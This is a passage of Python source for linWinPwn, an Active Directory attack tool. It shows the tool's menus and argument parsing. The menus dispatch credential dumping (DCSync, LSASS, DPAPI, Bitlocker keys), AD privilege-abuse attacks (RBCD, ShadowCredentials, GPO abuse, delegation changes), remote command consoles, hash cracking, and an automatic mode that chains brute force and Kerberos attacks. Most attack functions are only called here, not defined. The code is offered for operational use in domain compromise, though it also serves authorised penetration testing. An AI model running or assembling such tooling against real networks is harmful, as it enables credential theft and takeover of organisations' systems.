    print("13) PushSubscription abuse using PrivExchange")
    print("14) RunFinger scan")
    print("15) Run LDAPNightmare check")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        vuln_checks()
    elif option_selected.lower() == "m":
        modify_target()
    elif option_selected == "1":
        zerologon_check()
    elif option_selected == "2":
        ms17_010_check()
    elif option_selected == "3":
        spooler_check()
    elif option_selected == "4":
        printnightmare_check()
    elif option_selected == "5":
        webdav_check()
    elif option_selected == "6":
        coerceplus_check()
    elif option_selected == "7":
        smbsigning_check()
    elif option_selected == "8":
        ntlmv1_check()
    elif option_selected == "9":
        runasppl_check()
    elif option_selected == "10":
        smbghost_check()
    elif option_selected == "11":
        rpcdump_check()
    elif option_selected == "12":
        coercer_check()
    elif option_selected == "13":
        privexchange_check()
    elif option_selected == "14":
        runfinger_check()
    elif option_selected == "15":
        ldapnightmare_check()
    elif option_selected.lower() == "back":
        return  # Return to the main menu
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    vulns_menu()

def mssql_menu():
    os.makedirs(os.path.join(output_dir, "MSSQL"), exist_ok=True)
    print("")
    print(f"{CYAN}[MSSQL Enumeration menu]{NC} Please choose from the following options:")
    print("------------------------------------------------------------------")
    if nullsess_bool:
        print(f"{PURPLE}[-] MSSQL Enumeration requires credentials{NC}")
    else:
        print("A) MSSQL CHECKS #1-2")
        print("1) MSSQL Enumeration using netexec")
        print("2) MSSQL Relay check")
        print("3) Open mssqlclient.py console on target")
        print("4) Open mssqlpwner in interactive mode")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        mssql_checks()
    elif option_selected == "1":
        mssql_enum()
    elif option_selected == "2":
        mssql_relay_check()
    elif option_selected == "3":
        mssqlclient_console()
    elif option_selected == "4":
        mssqlpwner_console()
    elif option_selected.lower() == "back":
        return
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    mssql_menu()

def pwd_menu():
    os.makedirs(os.path.join(output_dir, "Credentials"), exist_ok=True)
    print("")
    print(f"{CYAN}[Password Dump menu]{NC} Please choose from the following options:")
    print("--------------------------------------------------------------")
    print(f"{YELLOW}[i]{NC} Current target(s): {curr_targets} {YELLOW}{custom_servers}{custom_ip}{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] Password Dump requires credentials{NC}")
    else:
        print("A) PASSWORD DUMPS #1-2-4-12-13-16")
        print("m) Modify target(s)")
        print("1) LAPS Dump using netexec")
        print("2) gMSA Dump using netexec")
        print("3) DCSync using secretsdump (only on DC)")
        print("4) Dump SAM and LSA using secretsdump")
        print("5) Dump SAM and SYSTEM using reg")
        print("6) Dump NTDS using netexec")
        print("7) Dump SAM using netexec")
        print("8) Dump LSA secrets using netexec")
        print("9) Dump LSASS using lsassy")
        print("10) Dump LSASS using handlekatz")
        print("11) Dump LSASS using procdump")
        print("12) Dump LSASS using nanodump")
        print("13) Dump dpapi secrets using netexec")
        print("14) Dump secrets using DonPAPI")
        print("15) Dump secrets using hekatomb (only on DC)")
        print("16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)")
        print("17) Dump Veeam credentials (only from Veeam server)")
        print("18) Dump Msol password (only from Azure AD-Connect server)")
        print("19) Extract Bitlocker Keys")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        pwd_dump()
    elif option_selected.lower() == "m":
        modify_target()
    elif option_selected == "1":
        laps_dump()
    elif option_selected == "2":
        gmsa_dump()
    elif option_selected == "3":
        secrets_dump_dcsync()
    elif option_selected == "4":
        secrets_dump()
    elif option_selected == "5":
        samsystem_dump()
    elif option_selected == "6":
        ntds_dump()
    elif option_selected == "7":
        sam_dump()
    elif option_selected == "8":
        lsa_dump()
    elif option_selected == "9":
        lsassy_dump()
    elif option_selected == "10":
        handlekatz_dump()
    elif option_selected == "11":
        procdump_dump()
    elif option_selected == "12":
        nanodump_dump()
    elif option_selected == "13":
        dpapi_dump()
    elif option_selected == "14":
        donpapi_dump()
    elif option_selected == "15":
        hekatomb_dump()
    elif option_selected == "16":
        juicycreds_dump()
    elif option_selected == "17":
        veeam_dump()
    elif option_selected == "18":
        msol_dump()
    elif option_selected == "19":
        bitlocker_dump()
    elif option_selected.lower() == "back":
        return  # Return to the main menu
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    pwd_menu() # Keep showing the menu

def modif_menu():
    os.makedirs(os.path.join(output_dir, "Modification"), exist_ok=True)
    print("")
    print(f"{CYAN}[Modification menu]{NC} Please choose from the following options:")
    print("-------------------------------------------------------------")
    print(f"{YELLOW}[i]{NC} Current target(s): {curr_targets} {YELLOW}{custom_servers}{custom_ip}{NC}")
    print("m) Modify target(s)")
    print("1) Change user or computer password (Requires: ForceChangePassword on user or computer)")
    print("2) Add user to group (Requires: GenericWrite or GenericAll on group)")
    print("3) Add new computer (Requires: MAQ > 0)")
    print("4) Add new DNS entry")
    print("5) Change Owner of target (Requires: WriteOwner permission)")
    print("6) Add GenericAll rights on target (Requires: Owner permission)")
    print("7) Targeted Kerberoast Attack (Noisy!)")
    print("8) Perform RBCD attack (Requires: GenericWrite or GenericAll or AllowedToAct on computer)")
    print("9) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)")
    print("10) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)")
    print("11) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)")
    print("12) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)")
    print("13) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)")
    print("14) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: GenericWrite or GenericAll on user)")
    print("15) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)")
    print("16) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected.lower() == "m":
        modify_target()
    elif option_selected == "1":
        change_pass()
    elif option_selected == "2":
        add_group_member()
    elif option_selected == "3":
        add_computer()
    elif option_selected == "4":
        dnsentry_add()
    elif option_selected == "5":
        change_owner()
    elif option_selected == "6":
        add_genericall()
    elif option_selected == "7":
        targetedkerberoast_attack()
    elif option_selected == "8":
        rbcd_attack()
    elif option_selected == "9":
        rbcd_spnless_attack()
    elif option_selected == "10":
        shadowcreds_attack()
    elif option_selected == "11":
        pygpo_abuse()
    elif option_selected == "12":
        add_unconstrained()
    elif option_selected == "13":
        add_spn()
    elif option_selected == "14":
        add_upn()
    elif option_selected == "15":
        add_spn_constrained()
    elif option_selected.lower() == "back":
        return
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    modif_menu()

def cmdexec_menu():
    os.makedirs(os.path.join(output_dir, "CommandExec"), exist_ok=True)
    print("")
    print(f"{CYAN}[Command Execution menu]{NC} Please choose from the following options:")
    print("------------------------------------------------------------------")
    print("1) Open CMD console using smbexec on target")
    print("2) Open CMD console using wmiexec on target")
    print("3) Open CMD console using psexec on target")
    print("4) Open PowerShell console using evil-winrm on target")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "1":
        smbexec_console()
    elif option_selected == "2":
        wmiexec_console()
    elif option_selected == "3":
        psexec_console()
    elif option_selected.lower() == "4":
        evilwinrm_console()
    elif option_selected.lower() == "back":
        return  # Return to the main menu
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    cmdexec_menu()

def init_menu():
    print("")
    print(f"{YELLOW}[Init menu]{NC} Please choose from the following options:")
    print("----------------------------------------------------")
    print("ENTER) Launch linWinPwn in interactive mode")
    print("A) Authentication Menu")
    print("C) Configuration Menu")
    print("exit) Exit")

    option_selected = input("> ").lower()

    if option_selected == "c":
        config_menu()
    elif option_selected == "a":
        auth_menu()
    elif option_selected == "":
        main_menu()  # Launch main menu in interactive mode
    elif option_selected == 'exit':
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}")
        init_menu()

def auth_menu():
    print("")
    print(f"{YELLOW}[Auth menu]{NC} Please choose from the following options:")
    print("----------------------------------------------------")
    print("1) Generate NTLM hash of current user (requires: password) - Pass the hash")
    print("2) Crack NTLM hash of current user (requires: NTLM hash)")
    print("3) Generate TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash")
    print("4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)")
    print("5) Request certificate (requires: authentication)")
    print("6) Generate AES Key using aesKrbKeyGen (requires: password)")
    print("back) Go back to Init Menu")
    print("exit) Exit")

    option_selected = input("> ").lower()
    if option_selected == "1":
       if pass_bool:
           hash_gen = subprocess.check_output(['openssl', 'dgst', '-md4'], input=password.encode('utf-16le')).decode().split(" ")[-1].strip()
           print(f"{GREEN}[+] NTLM hash generated:{NC} {hash_gen}")
           print(f"{GREEN}[+] Re-run linWinPwn to use hash instead:{NC} linWinPwn.sh -t {dc_ip} -d {domain} -u '{user}' -H {hash_gen}")
       else:
            print(f"{RED}[-] Error! Requires password...{NC}")
       auth_menu()
    elif option_selected == "2":
      if not john:
          print(f"{RED}[-] Please verify the installation of john{NC}")
          auth_menu()
          return
      if hash_bool:
          with open(f"{output_dir}/Credentials/ntlm_hash", "w") as f:
            f.write(hash.split(":")[1] if ":" in hash else hash)

          print(f"{CYAN}[*] Cracking NTLM hash using john the ripper{NC}")
          run_command(f"{john} {output_dir}/Credentials/ntlm_hash --format=NT --wordlist={pass_wordlist}")
          john_out = subprocess.getoutput(f"{john} {output_dir}/Credentials/ntlm_hash --format=NT --show")

          if "1 password" in john_out:
              password_cracked = john_out.split(":")[1].strip()
              print(f"{GREEN}[+] NTLM hash successfully cracked:{NC} {password_cracked}")
              print(f"{GREEN}[+] Re-run linWinPwn to use password instead:{NC} linWinPwn.sh -t {dc_ip} -d {domain} -u '{user}' -p {password_cracked}")
          else:
              print(f"{RED}[-] Failed to crack NTLM hash{NC}")
      else:
          print(f"{RED}[-] Error! Requires NTLM hash...{NC}")
      auth_menu()
    elif option_selected == '3':
      if not impacket_getTGT:
        print(f"{RED}[-] getTGT.py not found! Please verify the installation of impacket{NC}")
        auth_menu()
        return
      if pass_bool or hash_bool or aeskey_bool:
          current_dir = os.getcwd()
          os.chdir(os.path.join(output_dir, "Credentials"))
          print(f"{CYAN}[*] Requesting TGT for current user{NC}")
          run_command(f"{impacket_getTGT} {argument_imp} -dc-ip {dc_ip}")
          os.chdir(current_dir)
          krb_ticket = os.path.join(output_dir, "Credentials", f"{user}.ccache")
          if os.path.isfile(krb_ticket):
            print(f"{GREEN}[+] TGT generated successfully:{NC} '{krb_ticket}'")
            print(f"{GREEN}[+] Re-run linWinPwn to use ticket instead:{NC} linWinPwn.sh -t {dc_ip} -d {domain} -u '{user}' -K '{krb_ticket}'")
          else:
            print(f"{RED}[-] Failed to generate TGT{NC}")
      else:
          print(f"{RED}[-] Error! Requires password, NTLM hash or AES key...{NC}")
      auth_menu()
    elif option_selected == "4":
        if not certipy:
            print(f"{RED}[-] Please verify the installation of certipy{NC}")
            auth_menu()
            return
        if not cert_bool:
            print(f"{BLUE}[*] Please specify location of certificate file:{NC}")
            pfxcert = input(">> ")
            while not os.path.isfile(pfxcert):
                print(f"{RED}Invalid pfx file.{NC} Please specify location of certificate file:")
                pfxcert = input(">> ")

            if not pfxpass:
                print(f"{BLUE}[*] Please specify password of certificate file (press Enter if no password):{NC}")
                pfxpass = input(">> ")
        print(f"{CYAN}[*] Extracting NTLM hash from certificate using PKINIT{NC}")
        pkinit_auth()
        auth_menu()
    elif option_selected == "5":
      if not certipy:
            print(f"{RED}[-] Please verify the installation of certipy{NC}")
            auth_menu()
            return
      if pass_bool or hash_bool or aeskey_bool or kerb_bool:
          ne_adcs_enum()
          current_dir = os.getcwd()
          os.chdir(os.path.join(output_dir, "Credentials"))
          i = 0
          for pki_server in pki_servers:
            i += 1
            pki_ca = pki_cas[i-1].replace("SPACE", " ")
            run_command(f"{certipy} req {argument_certipy} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp -target {pki_server} -ca \"{pki_ca}\" -template User")
          os.chdir(current_dir)
          pfxcert_path = os.path.join(output_dir, "Credentials", f"{user}.pfx")
          pem_cert_path = os.path.join(output_dir, "Credentials", f"{user}.pem")
          
          if os.path.isfile(pfxcert_path):
            pfxcert = pfxcert_path
            pfxpass = ""
            print(f"{GREEN}[+] PFX Certificate requested successfully:{NC} '{pfxcert_path}'")
            
            # Convert pfx to pem
            openssl_cmd = f'{which("openssl")} pkcs12 -in "{pfxcert_path}" -out "{pem_cert_path}" -nodes -passin pass:""'
            subprocess.run(shlex.split(openssl_cmd), check=True)

            if os.path.isfile(pem_cert_path):
                pem_cert = pem_cert_path
                print(f"{GREEN}[+] PFX Certificate converted to PEM successfully:{NC} '{pem_cert_path}'")
            
            print(f"{GREEN}[+] Re-run linWinPwn to use certificate instead:{NC} linWinPwn.sh -t {dc_ip} -d {domain} -u '{user}' -C '{pfxcert}'")

          else:
              print(f"{RED}[-] Failed to request certificate{NC}")
      else:
          print(f"{RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...{NC}")
      auth_menu()
    elif option_selected == '6':
      if not aesKrbKeyGen:
          print(f"{RED}[-] Please verify the installation of aesKrbKeyGen.py{NC}")
          auth_menu()
          return # changed to return, as there's no point to continue
      if pass_bool:
        process = subprocess.run([python3, aesKrbKeyGen, '-domain', domain, '-u', user, '-pass', password], capture_output=True, text=True)
        aes_gen = process.stdout
        aes_key = ""
        for line in aes_gen.splitlines():
          if "AES256" in line:
            aes_key = line.split(" ")[-1]
        if aes_key:
            print(f"{GREEN}[+] AES Keys generated:{NC} {aes_gen}")
            print(f"{GREEN}[+] Re-run linWinPwn to use AES key instead:{NC} linWinPwn.sh -t {dc_ip} -d {domain} -u '{user}' -A {aes_key}")
        else:
            print(f"{RED}[-] Error generating AES Keys{NC}")
      else:
        print(f"{RED}[-] Error! Requires password...{NC}")
      auth_menu()
    elif option_selected.lower() == "back":
        init_menu()  # Corrected to call init_menu to go back
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}")
        auth_menu()  # Stay in the auth_menu on invalid input

def config_menu():
    os.makedirs(os.path.join(output_dir, "Config"), exist_ok=True)
    print("")
    print(f"{YELLOW}[Config menu]{NC} Please choose from the following options:")
    print("------------------------------------------------------")
    print("1) Check installation of tools and dependencies")
    print("2) Synchronize time with Domain Controller (requires root)")
    print("3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)")
    print("4) Update resolv.conf to define Domain Controller as DNS server (requires root)")
    print("5) Update krb5.conf to define realm and KDC for Kerberos (requires root)")
    print("6) Download default username and password wordlists (non-kali machines)")
    print("7) Change users wordlist file")
    print("8) Change passwords wordlist file")
    print("9) Change attacker's IP")
    print("10) Switch between LDAP (port 389) and LDAPS (port 636)")
    print("11) Show session information")
    print("back) Go back to Init Menu")
    print("exit) Exit")

    option_selected = input("> ").lower()

    if option_selected == "1":
        # Logic to check for installed tools (using which function)
        print("")
        tools = {
            "impacket's findDelegation": impacket_findDelegation,
            "impacket's GetUserSPNs": impacket_GetUserSPNs,
            "impacket's secretsdump": impacket_secretsdump,
            "impacket's GetNPUsers": impacket_GetNPUsers,
            "impacket's getTGT": impacket_getTGT,
            "impacket's goldenPac": impacket_goldenPac,
            "impacket's rpcdump": impacket_rpcdump,
            "impacket's reg": impacket_reg,
            "impacket's ticketer": impacket_ticketer,
            "impacket's getST": impacket_getST,
            "impacket's raiseChild": impacket_raiseChild,
            "impacket's changepasswd": impacket_changepasswd,
            "impacket's describeTicket": impacket_describeticket,
            "bloodhound": bloodhound,
            "ldapdomaindump": ldapdomaindump,
            "netexec": netexec,
            "john": john,
            "smbmap": smbmap,
            "nmap": nmap,
            "adidnsdump": adidnsdump,
            "certi.py": certi_py,
            "certipy": certipy,
            "ldeep": ldeep,
            "pre2k": pre2k,
            "certsync": certsync,
            "windapsearch": windapsearch,
            "enum4linux-ng": enum4linux_py,
            "kerbrute": kerbrute,
            "targetedKerberoast": targetedKerberoast,
            "CVE-2022-33679": CVE202233679,
            "silenthound": silenthound,
            "DonPAPI": donpapi,
            "hekatomb": hekatomb,
            "FindUncommonShares": FindUncommonShares,
            "ExtractBitlockerKeys": ExtractBitlockerKeys,
            "ldapconsole": ldapconsole,
            "pyLDAPmonitor": pyLDAPmonitor,
            "LDAPWordlistHarvester": LDAPWordlistHarvester,
            "rdwatool": rdwatool,
            "manspider": manspider,
            "coercer": coercer,
            "bloodyAD": bloodyad,
            "aced": aced,
            "sccmhunter": sccmhunter,
            "krbjack": krbjack,
            "ldapper": ldapper,
            "orpheus": orpheus,
            "adalanche": adalanche,
            "mssqlrelay": mssqlrelay,
            "pygpoabuse": pygpoabuse,
            "GPOwned": GPOwned,
            "privexchange": privexchange,
            "RunFinger": RunFinger,
            "LDAPNightmare": LDAPNightmare,
            "ADCheck": ADCheck,
            "adPEAS": adPEAS,
            "breads": breads,
            "smbclientng": smbclientng,
            "ldapnomnom": ldapnomnom,
            "godap": godap,
            "mssqlpwner": mssqlpwner,
            "soapy": soapy,
        }
        for tool, path in tools.items():
            if path:
                print(f"{GREEN}[+] {tool} is installed{NC}")
            else:
                print(f"{RED}[-] {tool} is not installed{NC}")
        config_menu()
    elif option_selected == "2":
        ntp_update()
        config_menu()
    elif option_selected == "3":
        etc_hosts_update()
        config_menu()
    elif option_selected == "4":
        etc_resolv_update()
        config_menu()
    elif option_selected == "5":
        etc_krb5conf_update()
        config_menu()
    elif option_selected == "6":
        print("")
        os.makedirs(wordlists_dir, exist_ok=True)
        try:
            # Using wget with subprocess.run for better control
            subprocess.run(['wget', '-q', "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz",
                            '-O', f"{wordlists_dir}/rockyou.txt.tar.gz"], check=True)
            subprocess.run(['gunzip', f"{wordlists_dir}/rockyou.txt.tar.gz"], check=True)
            subprocess.run(['tar', 'xf', f"{wordlists_dir}/rockyou.txt.tar", '-C', wordlists_dir], check=True)
            os.remove(f"{wordlists_dir}/rockyou.txt.tar") #Cleanup the tar file
            subprocess.run(['wget', '-q', "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt",
                            '-O', f"{wordlists_dir}/cirt-default-usernames.txt"], check=True)

            pass_wordlist = f"{wordlists_dir}/rockyou.txt"
            user_wordlist = f"{wordlists_dir}/cirt-default-usernames.txt"
            print(f"{GREEN}[+] Default username and password wordlists downloaded{NC}")

        except subprocess.CalledProcessError as e:
            print(f"{RED}[-] Error during download or extraction: {e}{NC}")
        except Exception as e:
             print("Error:" + str(e))
        config_menu()
    elif option_selected == "7":
        print(f"{BLUE}[*] Please specify new users wordlist file:{NC}")
        user_wordlist = input(">> ")
        print(f"{GREEN}[+] Users wordlist file updated{NC}")
        config_menu()
    elif option_selected == "8":
        print(f"{BLUE}[*] Please specify new passwords wordlist file:{NC}")
        pass_wordlist = input(">> ")
        print(f"{GREEN}[+] Passwords wordlist file updated{NC}")
        config_menu()
    elif option_selected == "9":
        print("")
        set_attackerIP()
        config_menu()
    elif option_selected == "10":
        print("")
        if ldaps_bool:
            ldaps_bool = False
            print(f"{GREEN}[+] Switched to using LDAP on port 389{NC}")
        else:
            ldaps_bool = True
            print(f"{GREEN}[+] Switched to using LDAPS on port 636{NC}")
        config_menu()
    elif option_selected == "11":
        print("")
        print_info()
        config_menu()
    elif option_selected.lower() == "back":
        init_menu()
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}")
        config_menu()  # Stay in config_menu on invalid input

def main_menu():
    parse_users()
    parse_servers()
    print("")
    print(f"{PURPLE}[Main menu]{NC} Please choose from the following options:")
    print("-----------------------------------------------------")
    print("1) Run DNS Enumeration using adidnsdump")
    print("2) Active Directory Enumeration Menu")
    print("3) ADCS Enumeration Menu")
    print("4) Brute Force Attacks Menu")
    print("5) Kerberos Attacks Menu")
    print("6) SMB shares Enumeration Menu")
    print("7) Vulnerability Checks Menu")
    print("8) MSSQL Enumeration Menu")
    print("9) Password Dump Menu")
    print("10) AD Objects or Attributes Modification Menu")
    print("11) Command Execution Menu")
    print("back) Go back to Init Menu")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "1":
        # Clear previous DNS enumeration results if they exist
        dns_records_path = os.path.join(output_dir, "DomainRecon", f"dns_records_{dc_domain}.csv")
        if os.path.exists(dns_records_path):
            os.remove(dns_records_path)
        dns_enum()
    elif option_selected == "2":
        ad_menu()
        return #return after finish, to avoid menu loop
    elif option_selected == "3":
        adcs_menu()
        return #return after finish, to avoid menu loop
    elif option_selected == "4":
        bruteforce_menu()
        return
    elif option_selected == "5":
        kerberos_menu()
        return
    elif option_selected == "6":
        shares_menu()
        return
    elif option_selected == "7":
        vulns_menu()
        return
    elif option_selected == "8":
        mssql_menu()
        return
    elif option_selected == "9":
        pwd_menu()
        return
    elif option_selected == "10":
        modif_menu()
        return
    elif option_selected == "11":
        cmdexec_menu()
        return
    elif option_selected.lower() == "back":
        init_menu()
        return #return after finish, to avoid menu loop
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    main_menu() # Always return back to the main_menu, except explicit exit/return

def main():
    print_banner()
    prepare()
    print_info()
    authenticate()
    print("")
    if interactive_bool:
        init_menu() # Start in interactive mode
    else:
      # Run automatic enumeration steps...
      parse_users()   # Parse user file
      parse_servers()   # Parse server file
      dns_enum()     # Run DNS enumeration
      print(f"{GREEN}[+] Start: Active Directory Enumeration${NC}")
      print(f"{GREEN}---------------------------------------${NC}")
      print("")
      ad_enum()      # Run AD enumeration
      print(f"{GREEN}[+] Start: ADCS Enumeration${NC}")
      print(f"{GREEN}---------------------------${NC}")
      print("")
      adcs_enum()  # Run ADCS Enumeration
      print(f"{GREEN}[+] Start: User and password Brute force Attacks${NC}")
      print(f"{GREEN}------------------------------------------------${NC}")
      print("")
      bruteforce() # Run all brute force methods
      print(f"{GREEN}[+] Start: Kerberos-based Attacks${NC}")
      print(f"{GREEN}----------------------------------${NC}")
      print("")
      kerberos() # Run All Kerberos attacks
      print(f"{GREEN}[+] Start: Network Shares Scan${NC}")
      print(f"{GREEN}------------------------------${NC}")
      print("")
      scan_shares()    # Run shares enumeration
      print(f"{GREEN}[+] Start: Vulnerability Checks${NC}")
      print(f"{GREEN}-------------------------------${NC}")
      print("")
      vuln_checks()    # Run Vulnerability checks
      print(f"{GREEN}[+] Start: MSSQL Enumeration${NC}")
      print(f"{GREEN}----------------------------${NC}")
      print("")
      mssql_checks()  # Run MSSQL Enumerations
      print("")
      print(f"{GREEN}[+] Automatic enumeration has completed. Output folder is: {output_dir}{NC}")
      print(f"{GREEN}---------------------------------------------------------${NC}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        for arg in sys.argv:
          if arg.lower() in ['-h', '--help']:
            help_linWinPwn()
            sys.exit(0)

    # Parse command-line arguments using a simple state machine
    args = iter(sys.argv[1:])  # Skip script name
    try:
        while True:
            arg = next(args)
            if arg in ("-t", "--target"):
                dc_ip = next(args)
            elif arg in ("-d", "--domain"):
                domain = next(args)
            elif arg in ("-u", "--user"):
                user = next(args)
            elif arg == "-p":
                password = next(args)
                pass_bool = True
            elif arg == "-H":
                hash = next(args)
                hash_bool = True
            elif arg == "-K":
                krb5cc = next(args)
                kerb_bool = True
            elif arg == "-A":
                aeskey = next(args)
                aeskey_bool = True
            elif arg == "-C":
                pfxcert = next(args)
                cert_bool = True
            elif arg == "--cert-pass":
                pfxpass = next(args)
            elif arg in ("-o", "--output"):
                output_dir = os.path.realpath(next(args))
            elif arg in ("-I", "--interface"):
                attacker_interface = next(args)
                attacker_IP = subprocess.getoutput(f"ip -f inet addr show {attacker_interface} | sed -En -e 's/.*inet ([0-9.]+).*/\\1/p'")
            elif arg in ("-T", "--targets"):
                targets = next(args)
            elif arg in ("-U", "--userwordlist"):
                user_wordlist = next(args)
            elif arg in ("-P", "--passwordlist"):
                pass_wordlist = next(args)
            elif arg == "--auto":
                interactive_bool = False
            elif arg == "--auto-config":
                autoconfig_bool = True
            elif arg == "--ldaps":
                ldaps_bool = True
            elif arg == "--ldap-binding":
                ldaps_bool = True
                ldapbinding_bool = True
            elif arg == "--force-kerb":
                forcekerb_bool = True
            elif arg == "--verbose":
                verbose_bool = True
            else:
                print_banner()
                print(f"{RED}[-] Unknown option:{NC} {arg}")
                print("Use -h for help")
                sys.exit(1)
    except StopIteration:  # End of arguments
        pass

    main()